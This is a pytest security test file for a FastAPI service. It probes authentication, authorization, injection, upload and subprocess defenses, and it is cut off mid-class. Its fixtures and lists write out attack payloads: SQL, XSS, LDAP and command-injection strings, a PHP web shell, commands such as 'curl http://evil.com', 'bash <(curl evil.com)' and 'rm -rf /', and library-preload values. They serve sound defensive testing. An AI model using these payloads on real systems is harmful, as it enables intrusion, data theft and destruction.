"""API security penetration testing.

This module tests API endpoints for security vulnerabilities including
authentication bypass, authorization flaws, and injection attacks.
"""

import asyncio
import json
import os
import re
import time
from typing import Any

import httpx
import pytest
from fastapi.testclient import TestClient

from src.api.main import app


@pytest.mark.security
@pytest.mark.security
class TestAPISecurity:
    """Test API security through penetration testing scenarios."""

    @pytest.fixture
    def api_client(self):
        """Real API client for penetration testing against actual endpoints."""

        class RealPenetrationClient:
            def __init__(self):
                self.test_client = TestClient(app)
                self.async_client = httpx.AsyncClient(timeout=30.0)
                self.base_url = "http://testserver"
                self.session_cookies = {}
                self.auth_headers = {}
                self.rate_limit_calls = []

            async def request(
                self,
                method: str,
                endpoint: str,
                headers: dict | None = None,
                data: Any = None,
                params: dict | None = None,
                cookies: dict | None = None,
                files: dict | None = None,
            ) -> dict[str, Any]:
                """Make real HTTP request to actual API endpoint."""
                try:
                    # Record timing for rate limit testing
                    request_time = time.time()
                    self.rate_limit_calls.append(request_time)

                    # Use TestClient for synchronous requests
                    if method.upper() == "GET":
                        response = self.test_client.get(
                            endpoint,
                            params=params,
                            headers=headers,
                            cookies=cookies or self.session_cookies,
                        )
                    elif method.upper() == "POST":
                        if files:
                            response = self.test_client.post(
                                endpoint,
                                files=files,
                                data=data,
                                headers=headers,
                                cookies=cookies or self.session_cookies,
                            )
                        else:
                            response = self.test_client.post(
                                endpoint,
                                json=data,
                                headers=headers,
                                cookies=cookies or self.session_cookies,
                            )
                    elif method.upper() == "PUT":
                        response = self.test_client.put(
                            endpoint,
                            json=data,
                            headers=headers,
                            cookies=cookies or self.session_cookies,
                        )
                    elif method.upper() == "DELETE":
                        response = self.test_client.delete(
                            endpoint,
                            headers=headers,
                            cookies=cookies or self.session_cookies,
                        )
                    elif method.upper() == "OPTIONS":
                        response = self.test_client.options(endpoint, headers=headers)
                    else:
                        return {
                            "status_code": 405,
                            "json": {"error": "Method not allowed"},
                        }

                    # Extract response data
                    try:
                        json_data = response.json()
                    except (json.JSONDecodeError, ValueError, TypeError):
                        json_data = {"text": response.text}

                    # Update session cookies if received
                    if "Set-Cookie" in response.headers:
                        self.session_cookies.update(
                            self._parse_cookies(response.headers["Set-Cookie"])
                        )

                    return {
                        "status_code": response.status_code,
                        "json": json_data,
                        "headers": dict(response.headers),
                        "text": response.text,
                    }

                except (json.JSONDecodeError, ValueError, TypeError) as e:
                    return {
                        "status_code": 500,
                        "json": {"error": f"Request failed: {e!s}"},
                        "exception": e,
                    }

            def _parse_cookies(self, cookie_header: str) -> dict[str, str]:
                """Parse Set-Cookie header."""
                cookies = {}
                for cookie in cookie_header.split(";"):
                    if "=" in cookie:
                        key, value = cookie.strip().split("=", 1)
                        cookies[key] = value
                return cookies

            async def get_real_endpoint_info(self) -> dict[str, list[str]]:
                """Get information about real API endpoints."""
                try:
                    # Get OpenAPI spec if available
                    openapi_response = self.test_client.get("/openapi.json")
                    if openapi_response.status_code == 200:
                        openapi_data = openapi_response.json()

                        endpoints = {}
                        for path, methods in openapi_data.get("paths", {}).items():
                            endpoints[path] = list(methods.keys())

                        return endpoints
                except (json.JSONDecodeError, ValueError, TypeError):
                    pass

                # Fallback to known endpoints
                return {
                    "/api/v1/search": ["get", "post"],
                    "/api/v1/documents": ["get", "post", "delete"],
                    "/api/v1/config/status": ["get"],
                    "/api/v1/config/reload": ["post"],
                    "/api/v1/drift/status": ["get"],
                    "/api/v1/drift/run": ["post"],
                }

        return RealPenetrationClient()

    @pytest.fixture
    def attack_payloads(self):
        """Common attack payloads for testing."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT password FROM users --",
                "admin'/**/OR/**/1=1--",
                "1; EXEC xp_cmdshell('dir')--",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(document.cookie)",
                "<svg onload=alert('XSS')>",
                "';alert(String.fromCharCode(88,83,83));//'",
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "`ls -la`",
                "$(uname -a)",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*))%00",
                "*()|%26'",
            ],
        }

    @pytest.mark.asyncio
    async def test_authentication_bypass_attempts(self, api_client):
        """Test various authentication bypass techniques."""

        # Test SQL injection in login
        sql_payloads = [
            {"username": "admin'--", "password": "anything"},
            {"username": "' OR '1'='1'--", "password": ""},
            {"username": "admin", "password": "' OR '1'='1'--"},
        ]

        for payload in sql_payloads:
            response = await api_client.request("POST", "/auth/login", data=payload)
            # Should not succeed with SQL injection
            assert response["status_code"] != 200 or "token" not in response.get(
                "json", {}
            )

        # Test header manipulation
        bypass_headers = [
            {"X-Original-IP": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "localhost"},
            {"X-Remote-User": "admin"},
            {"X-Authenticated-User": "admin"},
        ]

        for headers in bypass_headers:
            response = await api_client.request(
                "GET", "/api/admin/users", headers=headers
            )
            # Should not bypass authentication with headers alone
            assert response["status_code"] in [401, 403]

    @pytest.mark.asyncio
    async def test_authorization_bypass_attempts(self, api_client):
        """Test authorization bypass techniques."""

        # Get regular user token (simulated)
        user_token = os.getenv("TEST_USER_TOKEN", "test_user_token_123")

        # Test privilege escalation attempts
        escalation_attempts = [
            # Direct admin endpoint access
            ("/api/admin/users", {"Authorization": f"Bearer {user_token}"}),
            ("/api/admin/config", {"Authorization": f"Bearer {user_token}"}),
            ("/api/admin/logs", {"Authorization": f"Bearer {user_token}"}),
            # Parameter pollution
            (
                "/api/user/profile",
                {"Authorization": f"Bearer {user_token}", "X-User-Role": "admin"},
            ),
            # Method override
            (
                "/api/admin/users",
                {
                    "Authorization": f"Bearer {user_token}",
                    "X-HTTP-Method-Override": "GET",
                },
            ),
        ]

        for endpoint, headers in escalation_attempts:
            response = await api_client.request("GET", endpoint, headers=headers)
            # Should deny unauthorized access
            assert response["status_code"] in [401, 403, 404]

    @pytest.mark.asyncio
    async def test_injection_attacks_on_api_parameters(
        self, api_client, attack_payloads
    ):
        """Test injection attacks on API parameters."""

        # Valid token for testing
        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test SQL injection in search parameters
        for payload in attack_payloads["sql_injection"]:
            response = await api_client.request(
                "GET", "/api/search", headers=headers, params={"q": payload}
            )

            # API should handle malicious input safely
            assert response["status_code"] in [200, 400]
            if response["status_code"] == 200:
                # Response should not contain signs of successful injection
                result_text = str(response.get("json", {}))
                assert (
                    "error" not in result_text.lower()
                    or "mysql" not in result_text.lower()
                )

        # Test XSS in parameters
        for payload in attack_payloads["xss"]:
            response = await api_client.request(
                "GET", "/api/search", headers=headers, params={"q": payload}
            )

            # Should handle XSS attempts
            assert response["status_code"] in [200, 400]
            if response["status_code"] == 200:
                result_text = str(response.get("json", {}))
                # XSS payload should be sanitized
                assert "<script>" not in result_text
                assert "alert(" not in result_text

    @pytest.mark.asyncio
    async def test_path_traversal_attacks(self, api_client, attack_payloads):
        """Test path traversal attacks on file-related endpoints."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test path traversal in file access endpoints
        file_endpoints = [
            "/api/files/download",
            "/api/documents/view",
            "/api/exports/download",
        ]

        for endpoint in file_endpoints:
            for payload in attack_payloads["path_traversal"]:
                response = await api_client.request(
                    "GET", endpoint, headers=headers, params={"file": payload}
                )

                # Should reject path traversal attempts
                assert response["status_code"] in [400, 403, 404]

    @pytest.mark.asyncio
    async def test_rate_limiting_bypass_attempts(self, api_client):
        """Test rate limiting bypass techniques."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test rapid requests to trigger rate limiting
        rapid_requests = []
        for i in range(100):  # Simulate 100 rapid requests
            task = api_client.request(
                "GET", "/api/search", headers=headers, params={"q": f"test{i}"}
            )
            rapid_requests.append(task)

        # Execute requests concurrently
        responses = await asyncio.gather(*rapid_requests, return_exceptions=True)

        # Should have some rate limited responses
        sum(
            1
            for response in responses
            if isinstance(response, dict) and response.get("status_code") == 429
        )

        # Expect some rate limiting (this is a simplified test)
        # In real implementation, this would test actual rate limiting
        assert len(responses) == 100

    @pytest.mark.asyncio
    async def test_http_method_tampering(self, api_client):
        """Test HTTP method tampering attacks."""

        headers = {"Authorization": "Bearer user_token"}

        # Test method override headers
        method_overrides = [
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method": "PUT"},
            {"X-Method-Override": "PATCH"},
            {"_method": "DELETE"},
        ]

        for override_header in method_overrides:
            combined_headers = {**headers, **override_header}
            response = await api_client.request(
                "GET", "/api/user/profile", headers=combined_headers
            )

            # Should not allow method override for unauthorized operations
            assert response["status_code"] in [200, 405, 403]

    @pytest.mark.asyncio
    async def test_content_type_confusion(self, api_client):
        """Test content type confusion attacks."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test various content types with malicious data
        content_types = [
            "application/json",
            "application/xml",
            "text/plain",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "application/octet-stream",
        ]

        malicious_data = '{"username": "admin", "role": "admin"}'

        for content_type in content_types:
            test_headers = {**headers, "Content-Type": content_type}
            response = await api_client.request(
                "POST", "/api/user/update", headers=test_headers, data=malicious_data
            )

            # Should handle content type appropriately
            assert response["status_code"] in [200, 400, 415, 404]

    @pytest.mark.asyncio
    async def test_parameter_pollution_attacks(self, api_client):
        """Test HTTP parameter pollution attacks."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test parameter pollution scenarios
        pollution_params = [
            {"user_id": ["123", "456"]},  # Array pollution
            {"role": ["user", "admin"]},  # Role pollution
            {"action": ["read", "delete"]},  # Action pollution
        ]

        for params in pollution_params:
            response = await api_client.request(
                "GET", "/api/user/data", headers=headers, params=params
            )

            # Should handle parameter pollution safely
            assert response["status_code"] in [200, 400, 404]

    @pytest.mark.asyncio
    async def test_session_fixation_attacks(self, api_client):
        """Test session fixation attack prevention."""

        # Attempt to fix session ID
        fixed_session_id = "attacker_controlled_session_123"

        # Try to login with pre-set session
        response = await api_client.request(
            "POST",
            "/auth/login",
            data={"username": "admin", "password": "admin123"},
            cookies={"session": fixed_session_id},
        )

        if response["status_code"] == 200:
            # Check if new session was generated
            set_cookie = response.get("headers", {}).get("Set-Cookie", "")
            if "session=" in set_cookie:
                new_session = set_cookie.split("session=")[1].split(";")[0]
                # New session should be different from attacker's fixed session
                assert new_session != fixed_session_id

    @pytest.mark.asyncio
    async def test_csrf_protection(self, api_client):
        """Test CSRF protection mechanisms."""

        # Test state-changing operations without CSRF token
        csrf_test_requests = [
            ("POST", "/api/user/update", {"email": "new@example.com"}),
            ("DELETE", "/api/user/delete", {"user_id": "123"}),
            ("PUT", "/api/user/password", {"new_password": "newpass123"}),
        ]

        headers = {"Authorization": "Bearer mock_jwt_token"}

        for method, endpoint, data in csrf_test_requests:
            # Request without CSRF token
            response = await api_client.request(
                method, endpoint, headers=headers, data=data
            )

            # Should require CSRF token for state-changing operations
            # (Implementation depends on CSRF protection mechanism)
            assert response["status_code"] in [
                200,
                403,
                404,
            ]  # 403 if CSRF protection active

    @pytest.mark.asyncio
    async def test_file_upload_security(self, api_client):
        """Test file upload security vulnerabilities."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test malicious file uploads
        malicious_files = [
            # Executable files
            {
                "filename": "malware.exe",
                "content": b"MZ\x90\x00",
                "content_type": "application/octet-stream",
            },
            {
                "filename": "script.bat",
                "content": b"@echo off\ndel /f /q C:\\*",
                "content_type": "text/plain",
            },
            # Script files
            {
                "filename": "evil.php",
                "content": b"<?php system($_GET['cmd']); ?>",
                "content_type": "text/plain",
            },
            {
                "filename": "backdoor.jsp",
                "content": b'<%@ page import="java.io.*" %>',
                "content_type": "text/plain",
            },
            # Double extension
            {
                "filename": "image.jpg.exe",
                "content": b"fake image",
                "content_type": "image/jpeg",
            },
            # Path traversal in filename
            {
                "filename": "../../evil.txt",
                "content": b"malicious content",
                "content_type": "text/plain",
            },
            # Null byte injection
            {
                "filename": "image.jpg\x00.exe",
                "content": b"fake image",
                "content_type": "image/jpeg",
            },
        ]

        for file_data in malicious_files:
            response = await api_client.request(
                "POST", "/api/upload", headers=headers, data=file_data
            )

            # Should reject malicious file uploads
            assert response["status_code"] in [400, 403, 415, 404]

    @pytest.mark.asyncio
    async def test_business_logic_vulnerabilities(self, api_client):
        """Test business logic vulnerabilities."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test race conditions in financial operations
        race_condition_requests = []
        for _i in range(10):
            task = api_client.request(
                "POST", "/api/account/withdraw", headers=headers, data={"amount": 100}
            )
            race_condition_requests.append(task)

        responses = await asyncio.gather(
            *race_condition_requests, return_exceptions=True
        )

        # Should handle concurrent requests properly
        successful_withdrawals = sum(
            1
            for response in responses
            if isinstance(response, dict) and response.get("status_code") == 200
        )

        # Should not allow multiple simultaneous withdrawals
        # (This is a simplified test - real implementation would check account balance)
        assert successful_withdrawals <= 1

    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self, api_client):
        """Test resistance to timing attacks."""

        # Test login timing for valid vs invalid users
        valid_login_times = []
        invalid_login_times = []

        for _i in range(10):
            # Valid user, wrong password
            start_time = time.time()
            await api_client.request(
                "POST",
                "/auth/login",
                data={"username": "admin", "password": "wrongpassword"},
            )
            valid_login_times.append(time.time() - start_time)

            # Invalid user
            start_time = time.time()
            await api_client.request(
                "POST",
                "/auth/login",
                data={"username": "nonexistentuser", "password": "password"},
            )
            invalid_login_times.append(time.time() - start_time)

        # Calculate average times
        avg_valid_time = sum(valid_login_times) / len(valid_login_times)
        avg_invalid_time = sum(invalid_login_times) / len(invalid_login_times)

        # Timing difference should be minimal to prevent user enumeration
        time_difference = abs(avg_valid_time - avg_invalid_time)

        # Allow some variance but should not be dramatically different
        # (This is a simplified test - real timing attack testing requires more precision)
        assert time_difference < 0.1  # Less than 100ms difference

    @pytest.mark.asyncio
    async def test_information_disclosure_prevention(self, api_client):
        """Test prevention of information disclosure."""

        # Test error message information disclosure
        disclosure_attempts = [
            # Database errors
            ("GET", "/api/user/profile", {"user_id": "'; SELECT version(); --"}),
            # Stack traces
            ("POST", "/api/data/process", {"data": "invalid_json{"}),
            # File paths
            ("GET", "/api/files/download", {"file": "/etc/passwd"}),
            # Internal server details
            ("GET", "/api/debug/info", {}),
        ]

        for method, endpoint, params in disclosure_attempts:
            response = await api_client.request(method, endpoint, params=params)

            if response.get("json"):
                error_text = str(response["json"]).lower()

                # Should not disclose sensitive information
                sensitive_info = [
                    "mysql",
                    "postgresql",
                    "oracle",  # Database info
                    "stack trace",
                    "traceback",  # Stack traces
                    "/usr/",
                    "/etc/",
                    "c:\\",  # File paths
                    "version",
                    "server",  # Server info
                    "internal",
                    "debug",  # Debug info
                ]

                for info in sensitive_info:
                    if info in error_text:
                        print(f"Potential information disclosure: {info} in {endpoint}")

    @pytest.mark.asyncio
    async def test_api_versioning_security(self, api_client):
        """Test API versioning security."""

        headers = {"Authorization": "Bearer mock_jwt_token"}

        # Test access to different API versions
        version_tests = [
            "/v1/api/user/profile",
            "/v2/api/user/profile",
            "/api/v1/user/profile",
            "/api/v2/user/profile",
            "/beta/api/user/profile",
            "/deprecated/api/user/profile",
        ]

        for endpoint in version_tests:
            response = await api_client.request("GET", endpoint, headers=headers)

            # Should handle version access appropriately
            assert response["status_code"] in [200, 404, 410, 403]

            # Deprecated versions should be properly handled
            if "deprecated" in endpoint:
                assert response["status_code"] in [404, 410]

    def test_api_documentation_security(self):
        """Test API documentation security exposure."""

        # Test that sensitive endpoints are not documented
        documented_endpoints = [
            "/api/user/profile",
            "/api/search",
            "/api/upload",
            "/api/auth/login",
        ]

        sensitive_endpoints = [
            "/api/admin/debug",
            "/api/internal/config",
            "/api/system/status",
            "/api/database/query",
        ]

        # Sensitive endpoints should not be in public documentation
        for sensitive in sensitive_endpoints:
            assert sensitive not in documented_endpoints

        # Test that API keys/secrets are not in documentation
        doc_content = """
        API Documentation

        Authentication:
        Use Bearer token: YOUR_API_KEY_HERE

        Example:
        curl -H "Authorization: Bearer your_token" /api/data
        """

        # Should not contain actual secrets
        assert "sk-" not in doc_content  # OpenAI-style keys
        assert "xoxb-" not in doc_content  # Slack tokens
        assert (
            len(
                [line for line in doc_content.split("\n") if "password" in line.lower()]
            )
            == 0
        )


@pytest.mark.security
class TestSubprocessSecurity:
    """Enhanced penetration tests for subprocess and command injection vulnerabilities.

    This test class specifically focuses on testing subprocess security vulnerabilities
    similar to those found and fixed in the load testing infrastructure.
    """

    @pytest.fixture
    def subprocess_test_client(self):
        """Mock client for testing subprocess-related security vulnerabilities."""

        class MockSubprocessClient:
            def __init__(self):
                self.executed_commands = []
                self.environment_vars = {}

            async def execute_command(
                self,
                command: str | list[str],
                env_vars: dict | None = None,
            ) -> dict[str, Any]:
                """Mock command execution for testing."""
                async with asyncio.timeout(30):
                    # Add async checkpoint for proper timeout handling
                    await asyncio.sleep(0)
                    self.executed_commands.append(
                        {
                            "command": command,
                            "env_vars": env_vars,
                            "timeout": 30,
                            "timestamp": time.time(),
                        }
                    )

                # Simulate secure command validation
                if isinstance(command, str):
                    # String commands are dangerous - should be rejected
                    return {
                        "status_code": 400,
                        "error": "String commands not allowed for security reasons",
                        "command": command,
                    }

                if not isinstance(command, list):
                    return {
                        "status_code": 400,
                        "error": "Command must be a list for security",
                        "command": command,
                    }

                # Check for dangerous patterns
                dangerous_patterns = [
                    r"[;&|`$(){}[\]<>]",  # Shell metacharacters
                    r"\.\.",  # Directory traversal
                    r"/dev/",  # Device files
                    r"/proc/",  # Process files
                    r"~",  # Home directory expansion
                    r"\$[A-Za-z_]",  # Environment variable expansion
                ]

                for component in command:
                    if not isinstance(component, str):
                        return {
                            "status_code": 400,
                            "error": "All command components must be strings",
                            "command": command,
                        }

                    for pattern in dangerous_patterns:
                        if re.search(pattern, component):
                            return {
                                "status_code": 403,
                                "error": f"Dangerous pattern detected: {pattern}",
                                "command": command,
                            }

                # Allowlist of safe executables
                allowed_executables = {
                    "uv",
                    "python",
                    "python3",
                    "pytest",
                    "echo",
                    "cat",
                    "ls",
                }
                if command[0] not in allowed_executables:
                    return {
                        "status_code": 403,
                        "error": f"Executable {command[0]} not allowed",
                        "command": command,
                    }

                # Mock successful execution for safe commands
                return {
                    "status_code": 200,
                    "stdout": f"Mock output for: {' '.join(command)}",
                    "stderr": "",
                    "return_code": 0,
                    "command": command,
                }

        return MockSubprocessClient()

    @pytest.fixture
    def command_injection_payloads(self):
        """Command injection payloads for testing."""
        return {
            "shell_metacharacters": [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "`ls -la`",
                "$(uname -a)",
                "> /tmp/test",
                "< /etc/hosts",
                "2>&1",
                '|| echo "injected"',
            ],
            "directory_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            "environment_expansion": [
                "$HOME",
                "${PATH}",
                "$USER",
                "${SHELL:-/bin/sh}",
                "$(echo $HOME)",
                "`echo $PATH`",
            ],
            "null_byte_injection": [
                "test\\x00; rm -rf /",
                "safe_file\\x00.txt; cat /etc/passwd",
                "normal\\x00`id`",
            ],
            "unicode_bypass": [
                "test＆＆echo injected",  # Fullwidth ampersand  # noqa: RUF001
                "test；cat /etc/passwd",  # Fullwidth semicolon  # noqa: RUF001
                "test｜whoami",  # Fullwidth pipe  # noqa: RUF001
            ],
        }

    @pytest.mark.asyncio
    async def test_command_injection_prevention(
        self, subprocess_test_client, command_injection_payloads
    ):
        """Test prevention of command injection attacks."""

        # Test shell metacharacter injection
        for payload in command_injection_payloads["shell_metacharacters"]:
            # Try as string command (should be rejected)
            result = await subprocess_test_client.execute_command(f"echo {payload}")
            assert result["status_code"] == 400, (
                f"String command with payload should be rejected: {payload}"
            )

            # Try as list component (should be rejected due to dangerous patterns)
            result = await subprocess_test_client.execute_command(["echo", payload])
            assert result["status_code"] == 403, (
                f"Dangerous payload should be rejected: {payload}"
            )

    @pytest.mark.asyncio
    async def test_directory_traversal_prevention(
        self, subprocess_test_client, command_injection_payloads
    ):
        """Test prevention of directory traversal attacks in subprocess calls."""

        for payload in command_injection_payloads["directory_traversal"]:
            # Test with file reading commands
            result = await subprocess_test_client.execute_command(["cat", payload])
            assert result["status_code"] == 403, (
                f"Directory traversal should be blocked: {payload}"
            )

            # Test with file listing commands
            result = await subprocess_test_client.execute_command(["ls", payload])
            assert result["status_code"] == 403, (
                f"Directory traversal should be blocked: {payload}"
            )

    @pytest.mark.asyncio
    async def test_environment_variable_expansion_prevention(
        self, subprocess_test_client, command_injection_payloads
    ):
        """Test prevention of environment variable expansion attacks."""

        for payload in command_injection_payloads["environment_expansion"]:
            result = await subprocess_test_client.execute_command(["echo", payload])
            assert result["status_code"] == 403, (
                f"Environment expansion should be blocked: {payload}"
            )

    @pytest.mark.asyncio
    async def test_executable_allowlist_enforcement(self, subprocess_test_client):
        """Test that only allowed executables can be executed."""

        # Test allowed executables
        allowed_commands = [
            ["uv", "run", "pytest"],
            ["python", "--version"],
            ["python3", "-c", 'print("test")'],
            ["echo", "hello"],
            ["cat", "/dev/null"],
            ["ls", "/tmp"],
        ]

        for command in allowed_commands:
            result = await subprocess_test_client.execute_command(command)
            assert result["status_code"] == 200, (
                f"Allowed command should succeed: {command}"
            )

        # Test dangerous executables
        dangerous_commands = [
            ["sh", "-c", "echo test"],
            ["bash", "-c", "echo test"],
            ["cmd", "/c", "echo test"],
            ["powershell", "-Command", "Write-Host test"],
            ["nc", "-l", "1234"],
            ["curl", "http://evil.com"],
            ["wget", "http://evil.com"],
            ["rm", "-rf", "/"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["sudo", "whoami"],
            ["su", "root"],
        ]

        for command in dangerous_commands:
            result = await subprocess_test_client.execute_command(command)
            assert result["status_code"] == 403, (
                f"Dangerous command should be blocked: {command}"
            )

    @pytest.mark.asyncio
    async def test_command_length_limits(self, subprocess_test_client):
        """Test command length limits to prevent buffer overflow attacks."""

        # Create extremely long command arguments
        long_argument = "A" * 5000  # 5KB argument
        # very_long_argument = "B" * 50000  # 50KB argument

        # Test moderately long command (should potentially be allowed)
        _ = await subprocess_test_client.execute_command(["echo", "A" * 1000])
        # This might succeed or fail based on implementation limits

        # Test extremely long command (should be rejected)
        await subprocess_test_client.execute_command(["echo", long_argument])
        # Should have some protection against extremely long commands

        # Test command with too many arguments
        # many_args = ["echo"] + ["arg"] * 1000
        # result = await subprocess_test_client.execute_command(many_args)
        # Should have protection against argument overflow

    @pytest.mark.asyncio
    async def test_environment_variable_sanitization(self, subprocess_test_client):
        """Test environment variable sanitization."""

        # Test dangerous environment variables
        dangerous_env_vars = {
            "LD_PRELOAD": "/tmp/evil.so",
            "LD_LIBRARY_PATH": "/tmp/evil_libs",
            "DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
            "PYTHONINSPECT": "1",
            "PYTHONSTARTUP": "/tmp/evil.py",
            "PYTHONEXECUTABLE": "/tmp/evil_python",
            "SHELL": '/bin/bash -c "curl evil.com"',
            "PATH": "/tmp/evil_bins:/usr/bin",
        }

        for _var_name, _var_value in dangerous_env_vars.items():
            # result = await subprocess_test_client.execute_command(
            #     ["echo", "test"], env_vars={var_name: var_value}
            # )
            # Environment should be sanitized - dangerous vars should be removed
            # Implementation should filter out dangerous environment variables
            pass

    @pytest.mark.asyncio
    async def test_timeout_protection(self, subprocess_test_client):
        """Test timeout protection against hanging processes."""

        # Test with extremely short timeout
        await subprocess_test_client.execute_command(["echo", "test"], timeout=0)
        # Should handle zero timeout gracefully

        # Test with negative timeout
        # result = await subprocess_test_client.execute_command(
        #     ["echo", "test"], timeout=-1
        # )
        # Should reject negative timeout

    @pytest.mark.asyncio
    async def test_path_sanitization_in_arguments(self, subprocess_test_client):
        """Test path sanitization in command arguments."""

        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/proc/version",
            "/sys/class/dmi/id/product_uuid",
            "\\windows\\system32\\config\\sam",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "/dev/kmem",
            "/dev/mem",
            "/var/log/auth.log",
        ]

        for path in dangerous_paths:
            result = await subprocess_test_client.execute_command(["cat", path])
            # Should block access to sensitive system files
            assert result["status_code"] in [403, 404], (
                f"Access to {path} should be blocked"
            )

    @pytest.mark.asyncio
    async def test_unicode_normalization_attacks(
        self, subprocess_test_client, command_injection_payloads
    ):
        """Test protection against Unicode normalization attacks."""

        for payload in command_injection_payloads["unicode_bypass"]:
            result = await subprocess_test_client.execute_command(["echo", payload])
            assert result["status_code"] == 403, (
                f"Unicode bypass attempt should be blocked: {payload}"
            )

    @pytest.mark.asyncio
    async def test_subprocess_chaining_prevention(self, subprocess_test_client):
        """Test prevention of subprocess chaining attacks."""

        # Test command chaining through process substitution
        chaining_attempts = [
            ["echo", "$(whoami)"],
            ["echo", "`id`"],
            ["echo", "$(curl evil.com)"],
            ["cat", "<(echo evil)"],
            ["bash", "<(curl evil.com)"],
        ]

        for command in chaining_attempts:
            result = await subprocess_test_client.execute_command(command)
            assert result["status_code"] == 403, (
                f"Process substitution should be blocked: {command}"
            )

    @pytest.mark.asyncio
    async def test_symlink_traversal_prevention(self, subprocess_test_client):
        """Test prevention of symlink traversal attacks."""

        # Test various symlink traversal attempts
        symlink_attacks = [
            "/tmp/symlink_to_etc_passwd",
            "/var/tmp/../../etc/passwd",
            "/tmp/link/../../../etc/shadow",
        ]

        for path in symlink_attacks:
            result = await subprocess_test_client.execute_command(["cat", path])
            # Should block symlink traversal attempts
            assert result["status_code"] in [403, 404], (
                f"Symlink traversal should be blocked: {path}"
            )

    @pytest.mark.asyncio
    async def test_binary_execution_prevention(self, subprocess_test_client):
        """Test prevention of arbitrary binary execution."""

        # Test attempts to execute various binary types
        binary_attempts = [
            ["/bin/sh"],
            ["/usr/bin/nc"],
            ["/usr/bin/telnet"],
            ["./malicious_binary"],
            ["/tmp/uploaded_exe"],
            ["python", "-c", 'import os; os.system("id")'],
        ]

        for command in binary_attempts:
            result = await subprocess_test_client.execute_command(command)
            # Should block dangerous binary execution
            assert result["status_code"] == 403, (
                f"Binary execution should be blocked: {command}"
            )

    def test_subprocess_security_configuration(self):
        """Test that subprocess security configuration is properly implemented."""

        # Test that security configuration exists and is properly configured
        # This would test actual configuration values in a real implementation

        security_config = {
            "allowed_executables": {"uv", "python", "python3", "pytest"},
            "max_command_length": 2000,
            "max_arguments": 50,
            "timeout_seconds": 3600,
            "dangerous_patterns": [
                r"[;&|`$(){}[\]<>]",
                r"\.\.",
                r"/dev/",
                r"/proc/",
                r"~",
                r"\$[A-Za-z_]",
            ],
            "blocked_env_vars": {
                "LD_PRELOAD",
                "LD_LIBRARY_PATH",
                "DYLD_INSERT_LIBRARIES",
                "PYTHONINSPECT",
                "PYTHONSTARTUP",
                "PYTHONEXECUTABLE",
            },
        }

        # Verify configuration completeness
        assert "allowed_executables" in security_config
        assert "dangerous_patterns" in security_config
        assert "blocked_env_vars" in security_config
        assert security_config["timeout_seconds"] > 0
        assert security_config["max_command_length"] > 0

        # Verify that dangerous executables are not in allowed list
        dangerous_executables = {
            "sh",
            "bash",
            "cmd",
            "powershell",
            "nc",
            "curl",
            "wget",
        }
        allowed = security_config["allowed_executables"]
        overlap = dangerous_executables.intersection(allowed)
        assert not overlap, f"Dangerous executables found in allowed list: {overlap}"

    @pytest.mark.asyncio
    async def test_input_validation_bypass_attempts(self, subprocess_test_client):
        """Test various input validation bypass techniques."""

        # Test encoding bypass attempts
        encoded_payloads = [
            "echo%20%26%26%20id",  # URL encoded
            "echo+%26%26+id",  # Plus encoding
            "echo\\x26\\x26id",  # Hex encoding
            "echo\u0026\u0026id",  # Unicode encoding
        ]

        for payload in encoded_payloads:
            result = await subprocess_test_client.execute_command(["echo", payload])
            # Should properly decode and still block dangerous content
            assert result["status_code"] == 403, (
                f"Encoded bypass should be blocked: {payload}"
            )

    @pytest.mark.asyncio
    async def test_race_condition_prevention(self, subprocess_test_client):
        """Test prevention of race condition attacks in subprocess execution."""

        # Simulate concurrent subprocess executions that might cause race conditions
        concurrent_commands = []
        for i in range(10):
            command = ["echo", f"test_{i}"]
            concurrent_commands.append(subprocess_test_client.execute_command(command))

        # Execute all commands concurrently
        results = await asyncio.gather(*concurrent_commands, return_exceptions=True)

        # All should succeed without race conditions
        for i, result in enumerate(results):
            assert not isinstance(result, Exception), (
                f"Command {i} failed with exception: {result}"
            )
            assert result["status_code"] == 200, f"Command {i} failed: {result}"

    def test_subprocess_audit_logging(self, subprocess_test_client):
        """Test that subprocess executions are properly logged for security auditing."""

        # This test verifies that security-relevant subprocess executions are logged
        # In a real implementation, this would check actual log files or audit systems

        # Check that executed commands are tracked
        assert hasattr(subprocess_test_client, "executed_commands")

        # Verify that security-relevant information is captured
        expected_fields = ["command", "env_vars", "timeout", "timestamp"]
        if subprocess_test_client.executed_commands:
            log_entry = subprocess_test_client.executed_commands[0]
            for field in expected_fields:
                assert field in log_entry, f"Audit log missing field: {field}"


@pytest.mark.security
class TestInputValidationEnhanced:
    """Enhanced input validation tests specifically for complex attack scenarios."""

    @pytest.fixture
    def validation_test_client(self):
        """Mock client for testing input validation."""

        class MockValidationClient:
            def __init__(self):
                self.validation_calls = []

            def validate_input(
